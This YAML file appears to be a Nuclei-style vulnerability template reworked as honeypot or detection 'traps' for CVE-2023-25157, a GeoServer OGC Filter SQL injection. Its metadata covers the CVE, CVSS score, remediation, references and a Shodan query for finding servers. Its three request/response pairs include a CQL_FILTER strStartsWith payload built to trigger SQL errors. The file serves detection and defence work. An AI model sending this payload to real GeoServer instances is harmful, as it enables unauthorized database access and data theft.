id: CVE-2023-25157
info:
  name: GeoServer OGC Filter - SQL Injection
  author: ritikchaddha,DhiyaneshDK,iamnoooob,rootxharsh
  description: 'GeoServer is an open source software server written in Java that allows
    users to share and edit geospatial data. GeoServer includes support for the OGC
    Filter expression language and the OGC Common Query Language (CQL) as part of
    the Web Feature Service (WFS) and Web Map Service (WMS) protocols. CQL is also
    supported through the Web Coverage Service (WCS) protocol for ImageMosaic coverages.
    Users are advised to upgrade to either version 2.21.4, or version 2.22.2 to resolve
    this issue. Users unable to upgrade should disable the PostGIS Datastore *encode
    functions* setting to mitigate ``strEndsWith``, ``strStartsWith`` and ``PropertyIsLike
    `` misuse and enable the PostGIS DataStore *preparedStatements* setting to mitigate
    the ``FeatureId`` misuse.

    '
  severity: critical
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    execute arbitrary SQL queries, potentially leading to unauthorized access, data
    leakage, or data manipulation.

    '
  remediation: 'Apply the latest security patches or updates provided by the GeoServer
    project to fix the SQL Injection vulnerability.

    '
  reference:
  - https://twitter.com/parzel2/status/1665726454489915395
  - https://nvd.nist.gov/vuln/detail/CVE-2023-25157
  - https://github.com/win3zz/CVE-2023-25157
  - https://github.com/geoserver/geoserver/security/advisories/GHSA-7g5f-wrx8-5ccf
  - https://github.com/geoserver/geoserver/commit/145a8af798590288d270b240235e89c8f0b62e1d
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2023-25157
    cwe-id: CWE-89
    epss-score: 0.41862
    epss-percentile: 0.96974
    cpe: cpe:2.3:a:osgeo:geoserver:*:*:*:*:*:*:*:*
  metadata:
    verified: 'true'
    max-request: 3
    vendor: osgeo
    product: geoserver
    shodan-query: title:"geoserver"
  tags: cve2023,cve,geoserver,ogc,sqli,intrusive,osgeo
traps:
- request:
    method: GET
    path: /geoserver/ows?service=WFS&version=1.0.0&request=GetCapabilities
    headers: {}
    body: ''
  response:
    status_code: 200
    headers: {}
    body: ''
- request:
    method: GET
    path: /geoserver/ows?service=WFS&version=1.0.0&request=GetFeature&typeName=&maxFeatures=50&outputFormat=csv
    headers: {}
    body: ''
  response:
    status_code: 200
    headers: {}
    body: ''
- request:
    method: GET
    path: /geoserver/ows?service=WFS&version=1.0.0&request=GetFeature&typeName=&CQL_FILTER=strStartswith(,%27%27%27%27)=true
    headers: {}
    body: ''
  response:
    status_code: 200
    headers: {}
    body: SQL SELECT
